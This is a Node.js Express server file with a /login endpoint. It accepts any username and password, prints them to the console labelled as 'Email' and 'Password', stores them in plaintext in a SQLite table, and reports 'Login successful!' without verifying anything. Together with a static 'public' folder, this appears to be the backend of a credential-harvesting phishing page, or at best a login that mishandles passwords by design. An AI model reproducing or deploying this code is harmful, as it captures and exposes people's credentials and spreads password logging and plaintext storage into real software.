const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose(); // Import SQLite3

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Initialize SQLite database
const db = new sqlite3.Database('users.db', (err) => {
    if (err) {
        console.error('Error connecting to SQLite database:', err);
    } else {
        console.log('Connected to SQLite database');
        // Create a table for users if it doesn't exist
        db.run(`
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        `, (err) => {
            if (err) {
                console.error('Error creating users table:', err);
            } else {
                console.log('Users table created or already exists');
            }
        });
    }
});

// Endpoint to handle login and write to SQLite database
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }
    console.log(`Email: ${username}, Password: ${password}`);  // Shows credentials in the backend
    // Insert the username and password into the SQLite database
    const query = `INSERT INTO users (username, password) VALUES (?, ?)`;
    db.run(query, [username, password], (err) => {
        if (err) {
            console.error('Error writing to database:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.send('Login successful! Data written to database.');
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
